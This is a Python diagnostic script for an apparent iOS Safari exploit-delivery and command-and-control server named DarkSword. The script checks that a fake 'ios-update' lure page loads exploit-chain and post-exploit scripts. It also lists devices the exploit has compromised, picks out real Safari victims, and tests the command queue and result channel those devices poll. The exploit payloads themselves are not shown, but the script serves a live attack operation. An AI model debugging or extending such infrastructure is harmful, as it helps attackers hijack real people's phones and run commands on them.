# -*- coding: utf-8 -*-
# v20.4 DIAG-V2: 修了旧诊断 v1 的 3 个 bug（%d 格式化、段 7 curl 空输出、302 跳转后没验证 HTML 内容）
# 宝塔 SSH 运行:
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_diag_v2.py
import sqlite3, os, datetime, time, json, sys, traceback, urllib.request, urllib.parse, urllib.error

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
LOG_DIR = os.path.join(PROJ, 'logs')

def curl_http(url, ua='Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1',
               extra_headers=None, timeout=8, follow_redirects=True):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': ua, **(extra_headers or {})})
        if not follow_redirects:
            import http.client
            class NoRedirectH(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None
            opener = urllib.request.build_opener(NoRedirectH)
            resp = opener.open(req, timeout=timeout)
            return resp.getcode(), dict(resp.headers), resp.read().decode('utf-8','replace')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), dict(resp.headers), resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as he:
        try: body = he.read().decode('utf-8','replace')
        except Exception: body = ''
        return he.code, dict(getattr(he, 'headers', {}) or {}), body
    except Exception as ex:
        return None, {}, f'ConnectionError: {type(ex).__name__}: {ex}'

print("="*70)
print("🔍 DIAG-V2 [1/6] 302 跳转链：/ch/test001 → 302 → /e/group.html → 最终 HTML 里有没有三件套（platform_module/utility_module/chain_loader）")
print("="*70)
URLS = [
    ("渠道页 302(默认跟随重定向)", 'http://127.0.0.1:7070/ch/test001?ch=test001&tpl=ios-update', True),
    ("渠道页 不跟随(看 Location 头)", 'http://127.0.0.1:7070/ch/test001?ch=test001&tpl=ios-update', False),
    ("DarkSword landing", 'http://127.0.0.1:7070/e/group.html', True),
    ("HTTPS 公网 --resolve", 'https://aa1234.dpdns.org/ch/test001?ch=test001&tpl=ios-update', True),  # 最后一条不跑公网 HTTPS（用本地模拟即可），可以在下面单独 --resolve
]
for label, url, follow in URLS[:-1]:
    t0 = time.time()
    code, hdrs, body = curl_http(url, follow_redirects=follow)
    dt = int((time.time() - t0)*1000)
    loc = hdrs.get('Location') or hdrs.get('location') or ''
    cookies = [h for k,h in (hdrs.items() if isinstance(hdrs, dict) else []) if k.lower() == 'set-cookie']
    print(f"  {label}")
    print(f"    → HTTP={code}  time={dt}ms  size={len(body or '')}B  Location={loc!r}")
    if cookies: print(f"    → Set-Cookie: {[str(c)[:200] for c in cookies]}")
    if body and len(body) > 50:
        hits = {
            'platform_module.js': 'platform_module' in body,
            'utility_module.js': 'utility_module' in body,
            'chain_loader.js': 'chain_loader' in body,
            'post_exploit.js': 'post_exploit' in body,
            '__dsFireExploit': '__dsFireExploit' in body,
            'startPollingCommands': 'startPolling' in body,
            '<!doctype': ('<!doctype' in body.lower()) or ('<!DOCTYPE' in body),
        }
        print(f"    → 关键字符串命中: " + ", ".join([f"{k}={'✅' if v else '❌'}" for k,v in hits.items()]))
        print(f"    → HTML 前 400 字: {body[:400]!r}")

# ────────────────────────────────────────────────────────────────────
print("\n" + "="*70)
print("🔍 DIAG-V2 [2/6] devices + commands（修 %d 格式化 bug，全部 str()）")
print("="*70)
if os.path.exists(DB):
    conn = sqlite3.connect(DB); cur = conn.cursor()
    cols = [r[1] for r in cur.execute('PRAGMA table_info(devices)').fetchall()]
    devs = cur.execute(f"SELECT {','.join(cols)} FROM devices ORDER BY last_seen DESC").fetchall()
    print(f"  devices 总数 = {len(devs)}")
    KEEP = None
    for i, r in enumerate(devs):
        d = dict(zip(cols, r))
        ua = str(d.get('user_agent') or '')
        is_real = 'Safari/' in ua and 'curl' not in ua.lower() and str(d.get('ip') or '') not in ('127.0.0.1','')
        mark_real = ' ← ★ REAL SAFARI KEEP' if is_real and KEEP is None else ''
        mark_real += ' (curl/测试，忽略)' if not is_real and ('curl' in ua.lower() or str(d.get('ip') or '') == '127.0.0.1') else ''
        print(f"   #{i+1} uuid[:22]={str(d['device_uuid'] or '')[:22]}  ip={d.get('ip') or '?':<15}  exp={str(d.get('exploit_status') or '')[:10]:<10}  last_seen={str(d.get('last_seen') or '')[:19]}  OS={str(d.get('os_version') or ''):<6}  BR={str(d.get('browser_name') or ''):<8}{mark_real}")
        if is_real and KEEP is None: KEEP = d['device_uuid']
    print(f"  ★ KEEP UUID = {KEEP!r} (其他 Safari 真机都是昨天的旧会话，要删)")

    rs = cur.execute('''SELECT id, substr(device_uuid,1,22), command, status,
      datetime(created_at,'unixepoch','localtime') created,
      datetime(executed_at,'unixepoch','localtime') exec_at,
      length(coalesce(output,'')) outlen
      FROM commands ORDER BY id DESC LIMIT 16''').fetchall()
    print(f"\n  commands 最新 16 条 (全 str 无格式化 bug):")
    for r in rs:
        mark = ' ← ✅ EXECUTING (CMD-PICKUP 取走)' if str(r[3] or '') == 'executing' else ''
        mark += ' ← ✅ DONE (有结果)' if str(r[3] or '') in ('completed','failed') and int(r[6] or 0)>0 else ''
        print('   ' + '  '.join([str(x if x is not None else '') for x in r]) + mark)
    grp = cur.execute('''SELECT status, COUNT(*) FROM commands GROUP BY status''').fetchall()
    print(f"\n  commands 按 status 汇总: {dict(grp)}")
    orph = cur.execute('SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)').fetchone()[0]
    print(f"  orphan(不会被任何设备取到)= {orph}")
    conn.close()
else:
    print(f"  ❌ DB 不存在: {DB}")

# ────────────────────────────────────────────────────────────────────
print("\n" + "="*70)
print("🔍 DIAG-V2 [3/6] 本地 127.0.0.1:7070 模拟前端 GET /cmd（用 KEEP UUID） → 验证能否拿到 pending ds_info")
print("="*70)
KEEP_UUID=None
if os.path.exists(DB):
    conn = sqlite3.connect(DB); cur = conn.cursor()
    rows = cur.execute('''SELECT d.device_uuid FROM devices d
      WHERE d.exploit_status IN ('success','CHAIN','chain-succeeded') AND d.user_agent LIKE '%Safari%' AND d.user_agent NOT LIKE '%curl%' AND d.ip != '127.0.0.1'
      ORDER BY d.last_seen DESC LIMIT 1''').fetchone()
    KEEP_UUID = rows[0] if rows else None
    pending_count = 0
    if KEEP_UUID:
        pending_count = cur.execute('SELECT COUNT(*) FROM commands WHERE device_uuid=? AND status IN (\'pending\',\'deferred\')', (KEEP_UUID,)).fetchone()[0]
    conn.close()
print(f"  KEEP_UUID={KEEP_UUID!r} pending={pending_count}")
if KEEP_UUID:
    t0 = time.time()
    code, hdrs, body = curl_http(f'http://127.0.0.1:7070/cmd?device_uuid={urllib.parse.quote(KEEP_UUID)}&_={int(time.time())}')
    print(f"  → GET /cmd HTTP={code} time={int((time.time()-t0)*1000)}ms len={len(body or '')}")
    print(f"  → body[:500]={body[:500]!r}")
    try:
        parsed = json.loads(body or '[]')
        if isinstance(parsed, list) and len(parsed) > 0:
            print(f"  ✅ JSON parse OK → commands 有 {len(parsed)} 条！CMD-PICKUP 逻辑正常：" + ", ".join([f"id={c.get('id')} cmd={str(c.get('command') or '')[:20]}" for c in parsed[:5]]))
        else:
            print(f"  ℹ️  JSON parse OK → 返回空列表（无 pending / 被 MAX_CONCURRENT 占槽 / CMD-SAFARI-FILTER 过滤）")
    except Exception as e:
        print(f"  ⚠️  JSON parse 失败：{type(e).__name__}: {e} → body={body[:300]!r}")
    # 查刚才 GET /cmd 之后，DB status 是否从 pending → executing
    if os.path.exists(DB):
        import time as _t; _t.sleep(0.3)
        conn = sqlite3.connect(DB); cur = conn.cursor()
        x = cur.execute('SELECT id, status, command FROM commands WHERE device_uuid=? AND status=\'executing\' ORDER BY id DESC LIMIT 3', (KEEP_UUID,)).fetchall()
        print(f"  → 模拟 GET /cmd 后同设备 executing 命令 = {x}")
        conn.close()

# ────────────────────────────────────────────────────────────────────
print("\n" + "="*70)
print("🔍 DIAG-V2 [4/6] server.log 真实路径 + 最近 40 条（CMD-QUERY/CMD-PICKUP/STAGE 关键日志）")
print("="*70)
CAND = [os.path.join(LOG_DIR,'server.log'), os.path.join(PROJ,'server.log'), os.path.join(PROJ,'..','log')]
for lf in CAND:
    if os.path.isfile(lf) and os.path.getsize(lf) > 0:
        sz = os.path.getsize(lf)
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(lf)).strftime('%Y-%m-%d %H:%M:%S')
        print(f"  📄 {lf}  size={sz}B  mtime={mtime}")
        with open(lf, 'r', encoding='utf-8', errors='replace') as fh:
            lines = fh.readlines()[-40:]
        kw = ['CMD-QUERY','CMD-PICKUP','CMD-SAFARI-FILTER','CMD-EMPTY','CMD-NO-UUID','CMD-IDLE','CMD-STALE','CMD-RESET','CMD-RESULT','CMD-CONCURRENCY']
        kw2 = ['STAGE','RCE','SANDBOX','PRIV','CHAIN','INJECT','POST-CHAIN','post_exploit','chain_loader','LEGACY-MATCH','EXPLOIT']
        hits = [ln.rstrip() for ln in lines if any(k in ln for k in kw) or any(k in ln for k in kw2)]
        print(f"  ✅ 最近40行命中关键 {len(hits)} 条:")
        for h in hits[:30]: print("   ·", h[:260])
        if not hits:
            print("  ⚠️  最近40行 0 条 CMD-PICKUP/STAGE 日志 → 要么日志路径没写对，要么 exploit_server.py 的 log_to_file 代码路径根本没执行")
            print("  最近 8 行:")
            for ln in lines[-8:]: print("   ·", ln.rstrip()[:240])
    elif os.path.isdir(lf):
        try:
            subs = os.listdir(lf)[:20]
            print(f"  📂 {lf} 是目录，内容: {subs}")
        except Exception as e:
            print(f"  {lf} 是目录，列失败: {e}")
    else:
        print(f"  · {lf} 不存在 / 空")

# ────────────────────────────────────────────────────────────────────
print("\n" + "="*70)
print("🔍 DIAG-V2 [5/6] exploit_stdout.log + exploit 进程（exploit_server.py 启动时 import SyntaxError 会导致整个 exploit_server.py 崩掉，python3 pid=32189 不代表真在 serve）")
print("="*70)
for logname in ['exploit_stdout.log', 'admin_stdout.log', 'server_error.log']:
    p = os.path.join(LOG_DIR, logname)
    if os.path.isfile(p):
        sz = os.path.getsize(p)
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(p)).strftime('%Y-%m-%d %H:%M:%S')
        print(f"  📄 {p}  size={sz}B  mtime={mtime}")
        with open(p, 'r', encoding='utf-8', errors='replace') as fh:
            tail = fh.readlines()[-20:]
        kws = ['Error','error','Traceback','Exception','SyntaxError','OperationalError','ModuleNotFoundError','Address already in use','ImportError','No module']
        errs = [l.rstrip() for l in tail if any(k in l for k in kws)]
        if errs:
            print(f"  ⚠️  最近 20 行 ERROR {len(errs)} 条 (exploit_server.py 进程可能在崩了重启 loop):")
            for e in errs[:10]: print("   ·", e[:260])
        else:
            print(f"  ✅ 最近 20 行 0 条 ERROR（进程健康）。最近 5 行:")
            for ln in tail[-5:]: print("   ·", ln.rstrip()[:220])
import subprocess as sp
try:
    r = sp.run(['ps', '-ef'], capture_output=True, text=True, timeout=5)
    lines = [ln for ln in r.stdout.splitlines() if 'exploit_server.py' in ln and 'grep' not in ln]
    print(f"  ps exploit_server: {len(lines)} 个进程:")
    for ln in lines: print("   ·", ln[:240])
except Exception as e:
    print(f"  ps 失败（非 Linux）: {e}")
try:
    r = sp.run(['ss','-tlnp'], capture_output=True, text=True, timeout=5)
    ports = [ln for ln in r.stdout.splitlines() if any(k in ln for k in [':7070', ':7000', ':443', ':80'])]
    print(f"  ss listen 7070/7000/443/80 = {len(ports)} 行:")
    for ln in ports: print("   ·", ln[:220])
except Exception as e:
    print(f"  ss 失败: {e}")

# ────────────────────────────────────────────────────────────────────
print("\n" + "="*70)
print("🔍 DIAG-V2 [6/6] /cmd_result 回写通道（4 通道快速测 — 本机 127.0.0.1 只测 POST JSON 和 GET query）")
print("="*70)
TEST_UUID = 'ios-v204-diag-v2'
# 先 INSERT 一条 id=900000 pending 命令，再 POST /cmd_result 写 completed
if os.path.exists(DB):
    conn = sqlite3.connect(DB); cur = conn.cursor()
    cur.execute('DELETE FROM commands WHERE id>=900000 OR device_uuid=?', (TEST_UUID,))
    cur.execute('''INSERT INTO commands (id, device_uuid, command, status, created_at, executed_at, output)
      VALUES (900000,?,?,?,?,NULL,NULL)''', (TEST_UUID, 'ds_info_diag_v2', 'pending', int(time.time())))
    conn.commit(); conn.close()
payload = {'id':'900000','status':'completed','device_uuid':TEST_UUID,'output':'v20.4 diag-v2 /cmd_result POST JSON OK'}
t0 = time.time()
try:
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request('http://127.0.0.1:7070/cmd_result', data=data, method='POST',
        headers={'Content-Type':'application/json'})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode('utf-8','replace')
        print(f"  ✅ POST /cmd_result HTTP={resp.getcode()} time={int((time.time()-t0)*1000)}ms → {body[:200]!r}")
except Exception as e:
    print(f"  ❌ POST /cmd_result: {type(e).__name__}: {e}")
# GET query 测
t0 = time.time()
try:
    q = urllib.parse.urlencode({'id':'900000','status':'failed','device_uuid':TEST_UUID,'output':'v20.4 diag-v2 GET query OK','_':str(int(time.time()))})
    with urllib.request.urlopen(f'http://127.0.0.1:7070/cmd_result?{q}', timeout=5) as resp:
        body = resp.read().decode('utf-8','replace')
        print(f"  ✅ GET  /cmd_result HTTP={resp.getcode()} time={int((time.time()-t0)*1000)}ms → {body[:200]!r}")
except Exception as e:
    print(f"  ❌ GET  /cmd_result: {type(e).__name__}: {e}")
# DB 实锤写进了吗
if os.path.exists(DB):
    time.sleep(0.3)
    conn = sqlite3.connect(DB); cur = conn.cursor()
    r = cur.execute('SELECT id, status, substr(output,1,200) FROM commands WHERE id=900000').fetchone()
    print(f"  → DB cmd id=900000 实锤: id={r[0]} status={r[1]} output[:200]={r[2]!r}")
    cur.execute('DELETE FROM commands WHERE id>=900000 OR device_uuid=?', (TEST_UUID,)); conn.commit(); conn.close()
    print("  → 清理隔离 id=900000 行完毕")

print("\n✅ DIAG-V2 END（把所有输出贴我，6 段全贴，特别是 [3/6] GET /cmd 返回的 JSON 和 [5/6] exploit_stdout.log 有无 Traceback）")
